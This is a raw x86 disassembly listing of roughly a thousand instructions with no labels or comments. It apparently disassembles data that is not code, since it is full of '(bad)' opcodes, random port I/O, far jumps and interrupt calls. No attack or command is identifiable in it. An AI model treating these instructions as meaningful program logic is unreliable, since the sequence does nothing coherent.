  418d5c:	idiv   DWORD PTR [edi+ebp*1+0x28]
  418d60:	imul   BYTE PTR [edx]
  418d62:	cwde   
  418d63:	dec    edi
  418d64:	out    dx,eax
  418d65:	sub    cl,ch
  418d67:	mov    ah,0xeb
  418d69:	push   ss
  418d6a:	fisub  DWORD PTR [ebx+edi*1]
  418d6d:	test   BYTE PTR [ecx-0x3a10245c],bl
  418d73:	aaa    
  418d74:	jmp    0x418d51
  418d76:	push   ss
  418d77:	imul   ebp,ecx,0xaab0a7b4
  418d7d:	cmp    eax,0xc29ccb8b
  418d82:	inc    edi
  418d83:	shl    BYTE PTR [ebx],0x17
  418d86:	popa   
  418d87:	and    al,0x50
  418d89:	ss out 0x15,eax
  418d8c:	ja     0x418dc3
  418d8e:	mov    BYTE PTR [edi-0x43a90a85],dl
  418d94:	sbb    DWORD PTR [ecx+0x33deb24d],ebx
  418d9a:	lahf   
  418d9b:	lahf   
  418d9c:	pinsrw mm4,WORD PTR [eax],0x43
  418da0:	adc    al,0x52
  418da2:	jmp    0x418d84
  418da4:	and    esi,esi
  418da6:	pushf  
  418da7:	push   ss
  418da8:	adc    eax,0xbf8dd7bd
  418dad:	push   ds
  418dae:	call   0x4cf0:0x18c7c2a5
  418db5:	int    0x11
  418db7:	es inc ebx
  418db9:	les    esp,FWORD PTR [edi-0x130d2b5]
  418dbf:	adc    al,0x15
  418dc1:	sbb    BYTE PTR [edx],dl
  418dc3:	fldcw  WORD PTR [ecx]
  418dc5:	(bad)  
  418dc7:	pop    ebp
  418dc8:	fist   WORD PTR [ecx]
  418dca:	sub    BYTE PTR [edi-0x58e6cd54],dh
  418dd0:	fcomp  DWORD PTR [edx+0x33]
  418dd3:	aad    0xb5
  418dd5:	mov    bl,0xb4
  418dd7:	dec    esi
  418dd8:	fild   DWORD PTR [ebx-0xa]
  418ddb:	retf   0xf9af
  418dde:	mov    dl,0x2c
  418de0:	sbb    DWORD PTR [edi],ebp
  418de2:	push   edx
  418de3:	ret    
  418de4:	and    BYTE PTR [ebp-0x1a],dh
  418de7:	pop    edi
  418de8:	adc    al,0x2
  418dea:	add    BYTE PTR [ebx+0x445800fd],bl
  418df0:	fistp  QWORD PTR [ecx-0x18ce1f1]
  418df6:	div    edi
  418df8:	add    DWORD PTR [ebx+0x582bdaa0],eax
  418dfe:	and    eax,0xd1b4d155
  418e03:	sbb    eax,0x6573171a
  418e08:	xchg   ebp,eax
  418e09:	push   es
  418e0a:	xchg   esp,eax
  418e0b:	sbb    DWORD PTR [ecx-0x28],edx
  418e0e:	lea    ebp,[edi]
  418e10:	fxch   st(1)
  418e12:	jge    0x418e63
  418e14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e15:	test   BYTE PTR [edi-0x52],cl
  418e18:	xlat   BYTE PTR ds:[ebx]
  418e19:	jmp    0x74b93a62
  418e1e:	cwde   
  418e1f:	or     BYTE PTR cs:[esi],ch
  418e22:	jb     0x418e30
  418e24:	and    al,0x5c
  418e26:	minps  xmm4,XMMWORD PTR [ebp+0x6ed0e62]
  418e2d:	jle    0x418dcf
  418e2f:	hlt    
  418e30:	imul   ebx,DWORD PTR [edx+0x37c33ed7],0xf7870326
  418e3a:	fldenv [edx-0x45e8fabf]
  418e40:	xchg   BYTE PTR [esi],bl
  418e42:	jns    0x418e15
  418e44:	and    eax,0x80e44ab4
  418e49:	jns    0x418e96
  418e4b:	sub    BYTE PTR [eax*2+0x5f89a4ad],bh
  418e52:	repz sbb BYTE PTR [ebx-0x285173e7],dl
  418e59:	dec    ebp
  418e5a:	and    BYTE PTR [edi+0x66],0x7f
  418e5e:	xchg   ebp,eax
  418e5f:	cmp    esp,DWORD PTR [esi+ebp*2]
  418e62:	std    
  418e63:	imul   edi,DWORD PTR [edx+0x373488f1],0xffffff8e
  418e6a:	and    al,0x37
  418e6c:	push   eax
  418e6d:	dec    esp
  418e6e:	int    0x52
  418e70:	outs   dx,BYTE PTR ds:[esi]
  418e71:	mov    ecx,0x11b22a
  418e76:	hlt    
  418e77:	int    0x65
  418e79:	sub    eax,ebx
  418e7b:	push   es
  418e7c:	push   edx
  418e7d:	and    DWORD PTR [edx+ecx*1],edx
  418e80:	mov    ebx,0x4cadcba9
  418e85:	outs   dx,DWORD PTR ds:[esi]
  418e86:	je     0x418ed7
  418e88:	pop    edx
  418e89:	mov    ch,0x30
  418e8b:	adc    DWORD PTR [edx-0x3d],eax
  418e8e:	mov    edx,0x39cd8d54
  418e93:	out    0x83,eax
  418e95:	int    0xd1
  418e97:	cmp    DWORD PTR [edx+0x7a],eax
  418e9a:	cs ja  0x418e81
  418e9d:	mov    esp,0xde484030
  418ea2:	leave  
  418ea3:	mov    al,ds:0x5b768df9
  418ea8:	jl     0x418e78
  418eaa:	out    dx,al
  418eab:	push   esp
  418eac:	sub    BYTE PTR ds:0x4ec4644b,al
  418eb2:	scas   al,BYTE PTR es:[edi]
  418eb3:	xor    eax,0xd5852d69
  418eb8:	sbb    eax,0x990f7c87
  418ebd:	sbb    DWORD PTR [ecx],ebx
  418ebf:	push   eax
  418ec0:	inc    ecx
  418ec1:	push   ecx
  418ec2:	xchg   edi,eax
  418ec3:	pop    esp
  418ec4:	pop    ds
  418ec5:	sbb    BYTE PTR [ebp-0x5d9dc806],bh
  418ecb:	stos   DWORD PTR es:[edi],eax
  418ecc:	retf   
  418ecd:	repz out dx,al
  418ecf:	add    eax,0x552cd66b
  418ed4:	xchg   ebx,eax
  418ed5:	mov    esi,0x72b8657d
  418eda:	xchg   ecx,eax
  418edb:	pushf  
  418edc:	adc    al,0x30
  418ede:	sbb    DWORD PTR [edx],esp
  418ee0:	mov    ah,0x84
  418ee2:	mov    DWORD PTR [ebx],ecx
  418ee4:	mov    al,0x6
  418ee6:	jno    0x418e7a
  418ee8:	ins    DWORD PTR es:[edi],dx
  418ee9:	cmc    
  418eea:	mov    BYTE PTR [ecx+0x2ed1787b],al
  418ef0:	cmp    ebx,esp
  418ef2:	push   eax
  418ef3:	and    BYTE PTR [edx+0x7a],dh
  418ef6:	pushf  
  418ef7:	pop    ds
  418ef8:	mov    eax,ds:0x45e2946
  418efd:	aas    
  418efe:	mov    ch,0xfd
  418f00:	js     0x418f0e
  418f02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f03:	jns    0x418eeb
  418f05:	(bad)  
  418f06:	xchg   ecx,eax
  418f07:	cdq    
  418f08:	adc    BYTE PTR gs:[ecx],dl
  418f0b:	xor    dh,BYTE PTR [ecx]
  418f0d:	aas    
  418f0e:	aas    
  418f0f:	mov    DWORD PTR [edx-0x383a10e0],esi
  418f15:	mov    ebx,0xed9a03ba
  418f1a:	mov    edi,0xfbe8fa86
  418f1f:	lea    edi,[edx+0x1a]
  418f22:	dec    ebp
  418f23:	loopne 0x418eca
  418f25:	data16 je 0x418f5b
  418f28:	test   BYTE PTR [ebp+edi*4-0x63],ch
  418f2c:	xchg   edx,eax
  418f2d:	ds push edi
  418f2f:	mov    cl,0x84
  418f31:	loop   0x418f8d
  418f33:	sub    eax,0x6ca010e7
  418f38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f39:	rol    BYTE PTR [ecx-0x25],0xbe
  418f3d:	xor    edi,DWORD PTR [esi+eax*8]
  418f40:	or     ah,BYTE PTR [ecx*1+0x367e3561]
  418f47:	sub    eax,DWORD PTR [ecx-0x2aa4ac02]
  418f4d:	push   ecx
  418f4e:	rcl    DWORD PTR [ebx],1
  418f50:	call   0x74e445d7
  418f55:	les    ebx,FWORD PTR [esi-0x5e]
  418f58:	dec    eax
  418f59:	dec    esp
  418f5a:	rep lods eax,DWORD PTR ss:[esi]
  418f5d:	cmp    al,dl
  418f5f:	retf   0x1ee0
  418f62:	sbb    al,0xa4
  418f64:	es pop esi
  418f66:	and    edi,esi
  418f68:	js     0x418fdd
  418f6a:	mov    al,ds:0x303955f8
  418f6f:	lods   eax,DWORD PTR ds:[esi]
  418f70:	cmp    BYTE PTR [eiz*8+0x50032809],0x16
  418f78:	xchg   esi,eax
  418f79:	jecxz  0x418f5b
  418f7b:	iret   
  418f7c:	mov    BYTE PTR [eax],ch
  418f7e:	mov    ebp,0x6fe5bd11
  418f83:	sub    bh,BYTE PTR [ebx+0x4f41f5dd]
  418f89:	jb     0x418f86
  418f8b:	sbb    eax,DWORD PTR [esi+ebp*1]
  418f8e:	sub    DWORD PTR [edx+0x3a],esp
  418f91:	fisttp WORD PTR [ecx+0x77da31ca]
  418f97:	(bad)  
  418f98:	jno    0x418fb9
  418f9a:	cmc    
  418f9b:	jb     0x418fae
  418f9d:	in     al,0xdd
  418f9f:	push   ebx
  418fa0:	int3   
  418fa1:	xor    al,0xc4
  418fa4:	adc    al,0xf2
  418fa6:	in     al,0xc1
  418fa8:	sbb    ecx,0x40
  418fab:	sbb    BYTE PTR [edi],bl
  418fad:	jae    0x418fb7
  418faf:	push   edi
  418fb0:	sbb    DWORD PTR [ebp-0x3b],ecx
  418fb3:	push   esi
  418fb4:	shl    ebp,0x3a
  418fb7:	or     eax,0x8e0bc8b7
  418fbc:	add    al,ah
  418fbe:	imul   edx,DWORD PTR [ebx+ebp*1+0x5dd2e765],0x3bbfec9a
  418fc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fca:	(bad)  
  418fcb:	fsubr  DWORD PTR [edi]
  418fcd:	ror    BYTE PTR [edx],1
  418fcf:	jo     0x418fa8
  418fd1:	addr16 dec ecx
  418fd3:	jnp    0x418fc8
  418fd5:	ins    DWORD PTR es:[edi],dx
  418fd6:	pop    esi
  418fd7:	std    
  418fd8:	xchg   BYTE PTR [edi-0x6c],dh
  418fdb:	jp     0x419000
  418fdd:	sub    DWORD PTR [ebx-0x64],edx
  418fe0:	fdivr  st,st(7)
  418fe2:	bswap  esi
  418fe4:	std    
  418fe5:	xor    dh,BYTE PTR [ebx-0x44]
  418fe8:	mov    edi,0x90a09bef
  418fed:	sub    eax,0xcff73db4
  418ff2:	adc    ebp,edx
  418ff4:	aaa    
  418ff5:	test   al,0x3f
  418ff7:	add    bl,BYTE PTR [eax-0x54a7439f]
  418ffd:	jmp    0xeafa:0x4e180b90
  419004:	xchg   DWORD PTR [ebx-0x2d685db9],esp
  41900a:	push   ds
  41900b:	pop    edi
  41900c:	fild   DWORD PTR [edx+0x38]
  41900f:	mov    WORD PTR [ecx],es
  419011:	fisubr WORD PTR [edi-0xf]
  419014:	mov    ebx,0xa1914b17
  419019:	lods   eax,DWORD PTR ds:[esi]
  41901a:	adc    ecx,DWORD PTR ds:0x22711496
  419020:	jns    0x41906e
  419022:	dec    esi
  419023:	imul   esi,ecx,0x45b24be8
  419029:	fs test bl,dl
  41902c:	in     eax,0x2c
  41902e:	adc    BYTE PTR [eax-0x47],dh
  419031:	xlat   BYTE PTR ds:[ebx]
  419032:	add    eax,0x7fa134d0
  419037:	xor    ch,BYTE PTR [ecx+eiz*2]
  41903a:	je     0x418fd1
  41903c:	mov    ebx,0x25cd6647
  419041:	pop    es
  419042:	rcl    BYTE PTR [ecx+0xe],0x59
  419046:	xor    DWORD PTR [eax+0x33],esp
  419049:	in     al,dx
  41904a:	ins    DWORD PTR es:[edi],dx
  41904b:	mov    gs,WORD PTR [edi-0x79]
  41904e:	aam    0xde
  419050:	out    dx,al
  419051:	(bad)  
  419052:	push   esp
  419053:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419054:	cs (bad) 
  419056:	arpl   WORD PTR [esi],cx
  419058:	dec    esp
  419059:	inc    edi
  41905a:	xor    al,0x53
  41905c:	cmp    eax,0xec48c8cb
  419061:	lods   al,BYTE PTR ds:[esi]
  419062:	loopne 0x41907d
  419064:	cmp    dh,ah
  419066:	mov    esp,0xf5db2433
  41906b:	add    eax,0x1180bebc
  419070:	sbb    al,0xe7
  419072:	push   0x9d176749
  419077:	push   esp
  419078:	pop    ebp
  419079:	xchg   edx,eax
  41907a:	push   es
  41907b:	test   al,0xd7
  41907d:	and    al,0x5a
  41907f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419080:	mov    eax,ds
  419082:	xchg   dh,bl
  419084:	xor    DWORD PTR [edi+0x84703ad],esp
  41908a:	push   ebp
  41908b:	(bad)  
  41908c:	fstp   TBYTE PTR [ebp-0x77]
  41908f:	jo     0x41903d
  419091:	mov    ebp,0xb5544bfb
  419096:	pop    ebx
  419097:	xchg   ecx,eax
  419098:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419099:	sub    ebp,DWORD PTR [edi+0x65]
  41909c:	sub    al,0x68
  41909e:	mov    esp,0xd90dcb5d
  4190a3:	in     eax,0x6d
  4190a5:	cwde   
  4190a6:	xor    esi,DWORD PTR [ecx+0x6a27d7cc]
  4190ac:	sub    bh,BYTE PTR [esp+eiz*8+0x11]
  4190b0:	mov    bl,0x76
  4190b2:	xchg   BYTE PTR [ecx+edx*2],dh
  4190b5:	int    0xf3
  4190b7:	test   eax,0xc0619d60
  4190bc:	inc    esp
  4190bd:	xor    al,0x58
  4190bf:	ins    DWORD PTR es:[edi],dx
  4190c0:	imul   esp,DWORD PTR [edx+0x730c27ae],0x6a30883c
  4190ca:	frstor [ecx]
  4190cc:	dec    edx
  4190cd:	mov    BYTE PTR [eax],dh
  4190cf:	push   esp
  4190d0:	mov    dl,0x3d
  4190d3:	push   ebp
  4190d4:	inc    ebx
  4190d5:	les    edi,FWORD PTR [ecx]
  4190d7:	loopne 0x41912f
  4190d9:	xchg   esi,eax
  4190da:	sar    cl,1
  4190dc:	add    al,0x8
  4190de:	adc    bh,0x67
  4190e1:	fld    DWORD PTR [eax]
  4190e3:	ja     0x4190ce
  4190e5:	out    dx,eax
  4190e6:	push   ecx
  4190e7:	fisttp DWORD PTR [ecx-0x7b]
  4190ea:	xchg   edx,esp
  4190ec:	and    ah,BYTE PTR [eax+0x46f28984]
  4190f2:	push   cs
  4190f3:	xor    eax,0xf4a6df3
  4190f8:	adc    esi,DWORD PTR [eax+0x10]
  4190fb:	pop    ds
  4190fc:	or     edx,DWORD PTR [edx]
  4190fe:	test   al,0xae
  419100:	ret    
  419101:	inc    ebx
  419102:	cmp    ecx,ebp
  419104:	repnz icebp 
  419106:	mov    al,0x6
  419108:	retf   
  419109:	pop    esi
  41910a:	repz imul ebx,DWORD PTR [esp+ebx*1-0x17f2f67a],0xffffff87
  419113:	ins    DWORD PTR es:[edi],dx
  419114:	xor    bl,BYTE PTR [ebx+edx*4+0x71]
  419118:	retf   0xb1d7
  41911b:	jb     0x4190a6
  41911d:	and    DWORD PTR [ecx+0xd],esp
  419120:	adc    DWORD PTR [ebx+0xf],ebx
  419123:	cmp    al,0xf9
  419125:	and    DWORD PTR [ecx+ecx*2+0x7c],edi
  419129:	ja     0x4190e8
  41912b:	lds    esi,FWORD PTR [ecx+edx*2-0x3d]
  41912f:	mov    bl,0x66
  419131:	adc    dl,BYTE PTR [eax]
  419133:	cwde   
  419134:	hlt    
  419135:	and    eax,0xf5a57b41
  41913a:	retf   0xeb87
  41913d:	mov    dl,BYTE PTR [esi]
  41913f:	sub    eax,0x76fb028d
  419144:	(bad)  
  419145:	ficomp DWORD PTR [ebp+0x508d39c]
  41914b:	push   esi
  41914c:	fs push esi
  41914e:	das    
  41914f:	cwde   
  419150:	add    DWORD PTR [ecx+0x38],edx
  419153:	into   
  419154:	fsubr  QWORD PTR ss:[ebx-0x7c6de5ac]
  41915b:	les    ebp,FWORD PTR [ecx+0x6]
  41915e:	lds    edi,FWORD PTR [esi-0x53efc8c2]
  419164:	xchg   edi,eax
  419165:	pmullw mm0,QWORD PTR [esp+edx*4-0x4ff80d45]
  41916d:	loopne 0x4191e1
  41916f:	push   cs
  419170:	(bad)  
  419171:	jb     0x4191a5
  419173:	fisttp DWORD PTR [ebx+0x38]
  419176:	and    DWORD PTR [ecx],eax
  419178:	adc    BYTE PTR [ebx+ebp*4+0x1c986198],al
  41917f:	lods   al,BYTE PTR ds:[esi]
  419180:	call   0x808e3af1
  419185:	inc    DWORD PTR [ebp-0x7c40db21]
  41918b:	pop    ebx
  41918c:	push   ss
  41918d:	xchg   edx,eax
  41918e:	xchg   BYTE PTR [edi],bh
  419190:	pop    ds
  419191:	and    esi,DWORD PTR [ecx]
  419193:	(bad)  
  419194:	std    
  419195:	mov    eax,0x6d3017e1
  41919a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41919b:	mov    BYTE PTR [esi],ah
  41919d:	pop    edx
  41919e:	sbb    DWORD PTR [edi],esi
  4191a0:	(bad)  
  4191a1:	xor    BYTE PTR [edx+0x4ab28daf],ah
  4191a7:	pop    ss
  4191a8:	leave  
  4191a9:	sub    BYTE PTR [esi-0x78d38662],dh
  4191af:	loop   0x419183
  4191b1:	cmp    al,0x27
  4191b3:	and    dl,BYTE PTR [ebx]
  4191b5:	xor    eax,0xe7a53460
  4191ba:	lods   eax,DWORD PTR ds:[esi]
  4191bb:	cmc    
  4191bc:	mov    esp,0x63f86b7b
  4191c1:	xchg   ebp,eax
  4191c2:	inc    esp
  4191c3:	jns    0x4191fd
  4191c5:	loopne 0x4191d2
  4191c7:	push   cs
  4191c8:	stc    
  4191c9:	adc    eax,0x878f618c
  4191ce:	xchg   esi,eax
  4191cf:	aad    0xec
  4191d1:	jmp    0x8b13:0xc05193b4
  4191d8:	call   0x230e:0x80546a53
  4191df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191e0:	adc    BYTE PTR [edi+0x547fbbe0],bh
  4191e6:	push   0xffffffe4
  4191e8:	fistp  DWORD PTR [edi+0x70c964be]
  4191ee:	mov    bh,0xa
  4191f0:	cmc    
  4191f1:	push   0xd2b7acb3
  4191f6:	add    al,BYTE PTR ds:0xf243a1b8
  4191fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191fd:	jno    0x419213
  4191ff:	fxch   st(4)
  419201:	jmp    0xd2ae4058
  419206:	adc    dl,cl
  419208:	mov    ?,WORD PTR [ecx]
  41920a:	ret    
  41920b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41920c:	and    BYTE PTR [ebp+ecx*2-0x13941f24],bh
  419213:	sub    BYTE PTR [edi],0x5e
  419216:	daa    
  419217:	call   0x4994:0x1e0071d9
  41921e:	test   al,0x5a
  419220:	sbb    eax,DWORD PTR [ebx+ebp*1-0xd4f4301]
  419227:	mov    dl,0x4e
  419229:	push   cs
  41922a:	je     0x41920b
  41922c:	sbb    edx,DWORD PTR [edi]
  41922e:	pop    ss
  41922f:	xchg   ebx,eax
  419230:	sbb    cl,ch
  419232:	or     edx,esi
  419234:	xchg   ecx,eax
  419235:	xlat   BYTE PTR ds:[ebx]
  419236:	or     esp,ecx
  419238:	int3   
  419239:	test   al,0x31
  41923b:	dec    ebx
  41923c:	outs   dx,DWORD PTR ds:[esi]
  41923d:	xchg   BYTE PTR [edx],dl
  41923f:	(bad)  
  419240:	iret   
  419241:	sub    eax,0x596f6915
  419246:	loop   0x41920f
  419248:	xor    ebx,DWORD PTR [ebx-0x2f]
  41924b:	in     al,0xb
  41924d:	dec    esp
  41924e:	xchg   esi,eax
  41924f:	dec    edi
  419250:	push   ds
  419251:	mov    dl,0x3a
  419253:	dec    edx
  419254:	and    dl,BYTE PTR [ecx]
  419256:	aaa    
  419257:	mov    ebx,0xbe64e635
  41925c:	xor    al,0xa2
  41925e:	inc    esi
  41925f:	jnp    0x4192df
  419261:	adc    eax,0x735b6e3
  419266:	(bad)
  419269:	pushf  
  41926a:	push   edx
  41926b:	stc    
  41926c:	pop    edi
  41926d:	inc    ebx
  41926e:	aaa    
  41926f:	jae    0x419296
  419271:	inc    BYTE PTR [ecx+0x1af7e6a9]
  419277:	jl     0x41921c
  419279:	(bad)  
  41927a:	std    
  41927b:	out    dx,al
  41927c:	dec    edx
  41927d:	xor    eax,0x601bdbeb
  419282:	call   0x79c4f1e0
  419287:	pop    ebx
  419288:	popa   
  419289:	ins    BYTE PTR es:[edi],dx
  41928a:	fisub  WORD PTR [edi-0x3b]
  41928d:	sar    BYTE PTR [edx-0x39],0x3a
  419291:	lods   al,BYTE PTR ds:[esi]
  419292:	adc    DWORD PTR [ebx+0x5696a8d4],0xbe8018fe
  41929c:	jo     0x41926b
  41929e:	pop    ds
  41929f:	jle    0x419243
  4192a1:	push   edi
  4192a2:	out    0xe1,eax
  4192a4:	pop    ebp
  4192a5:	mov    ebx,0x6b2598ac
  4192aa:	dec    DWORD PTR [eax-0x18a1c647]
  4192b0:	xchg   bp,ax
  4192b2:	mov    ds:0xa885fc52,eax
  4192b7:	or     BYTE PTR [esi-0x68],ah
  4192ba:	mov    dl,BYTE PTR [ebx-0x2]
  4192bd:	lock pusha 
  4192bf:	pop    ss
  4192c0:	pop    ss
  4192c1:	pop    ds
  4192c2:	in     al,0x8b
  4192c4:	fisubr WORD PTR [edx-0x26]
  4192c7:	es push eax
  4192c9:	mov    ebx,0xb1add751
  4192ce:	adc    BYTE PTR [edx+0x9],cl
  4192d1:	ins    DWORD PTR es:[edi],dx
  4192d2:	(bad)  
  4192d3:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4192d5:	or     BYTE PTR [ebp-0x5b],bh
  4192d8:	(bad)  
  4192d9:	jmp    0x8b5cd13c
  4192de:	(bad)  
  4192e0:	bound  esi,QWORD PTR [edi]
  4192e2:	add    al,0xd2
  4192e4:	xchg   edx,eax
  4192e5:	push   ecx
  4192e6:	in     al,dx
  4192e7:	dec    esi
  4192e8:	cmc    
  4192e9:	out    dx,al
  4192ea:	xor    BYTE PTR [esp+edx*8],ah
  4192ed:	pushf  
  4192ee:	call   0xad5bcaef
  4192f3:	int3   
  4192f4:	mov    edi,0x41ab0078
  4192f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192fa:	pop    edx
  4192fb:	jmp    0x5f403072
  419300:	icebp  
  419301:	imul   BYTE PTR [edx-0x34fdd1fd]
  419307:	dec    eax
  419308:	or     dl,BYTE PTR [esi+0x5bdb9513]
  41930e:	out    0x26,eax
  419310:	pop    edi
  419311:	sub    al,0x79
  419313:	fwait
  419314:	sub    DWORD PTR [ebx-0x43],0x425d1c6c
  41931b:	mov    esi,0xaffd964f
  419320:	mov    ds:0xb7c67994,eax
  419325:	retf   
  419326:	(bad)  
  419327:	fnstcw WORD PTR [ebp+0x45]
  41932a:	icebp  
  41932b:	daa    
  41932c:	sub    BYTE PTR [edi+0x61],al
  41932f:	xor    esi,edi
  419331:	jmp    0xf24dda86
  419336:	mov    esi,0xfb204d9f
  41933b:	clc    
  41933c:	dec    ecx
  41933d:	push   ss
  41933e:	sbb    eax,0x61819ad
  419343:	dec    ebx
  419344:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419345:	test   BYTE PTR [ebx-0x56],dh
  419348:	test   BYTE PTR [ebx-0x3a],al
  41934b:	int    0x8a
  41934d:	or     DWORD PTR [ebp-0x46556223],0xc602ba3
  419357:	dec    esp
  419358:	jmp    0x65465021
  41935d:	sbb    eax,DWORD PTR [edi+0x78]
  419360:	jne    0x41931f
  419362:	cmp    eax,DWORD PTR [edi+0x32]
  419365:	jg     0x419345
  419367:	in     al,dx
  419368:	sub    esp,DWORD PTR [esi+0x4469f136]
  41936e:	idiv   BYTE PTR [ecx-0x3da492a1]
  419374:	ficom  DWORD PTR [ecx-0x39]
  419377:	sar    BYTE PTR [edx+ebx*1],1
  41937a:	jb     0x419340
  41937c:	rol    DWORD PTR fs:[edi+0x1d4b845b],0xca
  419384:	lods   al,BYTE PTR ds:[esi]
  419385:	cmp    esi,eax
  419387:	loope  0x4193e6
  419389:	call   0xab1dcbd9
  41938e:	pop    edi
  41938f:	adc    DWORD PTR [edx+ecx*4-0x52],eax
  419393:	(bad)  
  419394:	mov    bl,0x7d
  419396:	outs   dx,BYTE PTR ds:[esi]
  419397:	mov    esi,gs
  419399:	mov    dl,0xa6
  41939b:	shl    DWORD PTR [esi+ebp*2-0x3d411c38],0x6c
  4193a3:	jne    0x419413
  4193a5:	test   al,0x80
  4193a7:	jle    0x419352
  4193a9:	xchg   edx,eax
  4193aa:	adc    DWORD PTR [ecx-0x5d],0x51
  4193ae:	fldenv [edx-0x18]
  4193b1:	xchg   esi,eax
  4193b2:	int    0xa8
  4193b4:	push   ebp
  4193b5:	and    DWORD PTR [edx+0x78d8539c],0xe79f07d
  4193bf:	idiv   DWORD PTR [eax+0x3867451b]
  4193c5:	test   edx,esp
  4193c7:	daa    
  4193c8:	xchg   esp,eax
  4193c9:	outs   dx,DWORD PTR ds:[esi]
  4193ca:	arpl   WORD PTR [edx],sp
  4193cc:	repz popf 
  4193ce:	sahf   
  4193cf:	ret    
  4193d0:	aam    0x71
  4193d2:	sub    eax,0xd39b35a6
  4193d7:	std    
  4193d8:	aaa    
  4193d9:	mov    ebp,DWORD PTR ds:0xc1b6c068
  4193df:	ins    BYTE PTR es:[edi],dx
  4193e0:	xchg   edi,eax
  4193e1:	jmp    0x4193fa
  4193e3:	(bad)  
  4193e4:	neg    BYTE PTR [eax]
  4193e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193e7:	xchg   ebx,eax
  4193e8:	sub    eax,0x184f1d0c
  4193ed:	jae    0x419393
  4193ef:	into   
  4193f0:	aad    0xee
  4193f2:	pop    ebx
  4193f3:	out    0x93,al
  4193f5:	das    
  4193f6:	jae    0x4193eb
  4193f8:	xchg   esi,ecx
  4193fa:	fxch   st(3)
  4193fc:	sbb    DWORD PTR [ebp+0x5cd73706],eax
  419402:	adc    bh,0x57
  419405:	repnz mov ecx,0xc1e23706
  41940b:	add    al,0xe8
  41940d:	push   cs
  41940e:	mov    bl,0x26
  419410:	jge    0x4193e7
  419412:	mov    ebp,0xd71277e6
  419417:	inc    esp
  419418:	xchg   ebx,eax
  419419:	(bad)  
  41941a:	iret   
  41941b:	xor    edi,DWORD PTR [edi-0x27851700]
  419421:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419422:	outs   dx,DWORD PTR ds:[esi]
  419423:	pushf  
  419424:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419425:	jb     0x419437
  419427:	leave  
  419428:	ins    BYTE PTR es:[edi],dx
  419429:	mov    al,ds:0x4fcbd315
  41942e:	jmp    0x2a7d:0x5c4494b9
  419435:	and    BYTE PTR [ecx-0x5ac63b94],dl
  41943b:	push   cs
  41943c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41943d:	out    dx,eax
  41943e:	out    dx,al
  41943f:	jmp    0x419462
  419441:	scas   al,BYTE PTR es:[edi]
  419442:	add    eax,0xdba74b3f
  419447:	stos   DWORD PTR es:[edi],eax
  419448:	inc    ebp
  419449:	in     al,dx
  41944a:	shr    ebp,cl
  41944c:	lods   eax,DWORD PTR ds:[esi]
  41944d:	ja     0x419483
  41944f:	dec    ebx
  419450:	loope  0x4193fa
  419452:	cmp    al,0xcd
  419454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419455:	sbb    eax,eax
  419457:	push   eax
  419458:	mul    DWORD PTR [edi-0x6ba23e3f]
  41945e:	jecxz  0x41944a
  419460:	jae    0x41942f
  419462:	jne    0x41945d
  419464:	cmp    al,0x93
  419466:	and    DWORD PTR [ebp+0x3409d698],eax
  41946c:	adc    cl,BYTE PTR [esi]
  41946e:	loope  0x41949a
  419470:	fnstcw WORD PTR [eax-0x4a]
  419473:	push   cs
  419474:	pop    esi
  419475:	cmp    dh,al
  419477:	call   0x93b1:0xf716f6b2
  41947e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41947f:	xlat   BYTE PTR ds:[ebx]
  419480:	clc    
  419481:	rol    ecx,0x2e
  419484:	push   0xffffffbe
  419486:	sets   BYTE PTR [edi]
  419489:	(bad)  [ecx+0x3d]
  41948c:	jns    0x4194dd
  41948e:	or     eax,0x152d09a7
  419493:	sub    eax,0x7cff108
  419498:	mov    ds:0x4798ee61,eax
  41949d:	(bad)  
  41949e:	int    0xb9
  4194a0:	popf   
  4194a1:	push   cs
  4194a2:	xor    ebx,DWORD PTR [eax+ebp*1+0x3cbdbb7a]
  4194a9:	(bad)  
  4194aa:	in     al,0xd9
  4194ac:	iret   
  4194ad:	add    al,0x11
  4194af:	pop    esi
  4194b0:	ror    BYTE PTR [esi+0x68156dac],0x24
  4194b7:	sbb    DWORD PTR ds:0x29addc43,esp
  4194bd:	sbb    ebp,DWORD PTR [ebx-0x4c1094d6]
  4194c3:	and    eax,0x2f288ba3
  4194c8:	mov    eax,0x8cccf825
  4194cd:	dec    eax
  4194ce:	gs aam 0x33
  4194d1:	test   eax,0xc262ab8b
  4194d6:	cmp    ebp,DWORD PTR [edx+0x3a3c2838]
  4194dc:	hlt    
  4194dd:	pop    ebp
  4194de:	cmp    al,0x1d
  4194e0:	or     BYTE PTR [edx],bl
  4194e2:	mov    ds:0xfa016c72,eax
  4194e7:	pop    eax
  4194e8:	cmp    BYTE PTR [edx-0xa],ah
  4194eb:	outs   dx,BYTE PTR ds:[esi]
  4194ec:	sub    al,BYTE PTR [ebx-0x4749c926]
  4194f2:	imul   ecx,DWORD PTR [edx-0x26eca19a],0xf
  4194f9:	jl     0x4194e5
  4194fb:	cdq    
  4194fc:	mov    ebx,DWORD PTR [ecx+0x6d729ada]
  419502:	fnstsw WORD PTR [edi+0x3c83e010]
  419508:	out    dx,al
  419509:	and    DWORD PTR [eax-0x3b],ebx
  41950c:	mov    al,ds:0xb536fca7
  419511:	push   0x239bdd1a
  419516:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419517:	std    
  419518:	lods   al,BYTE PTR ds:[esi]
  419519:	daa    
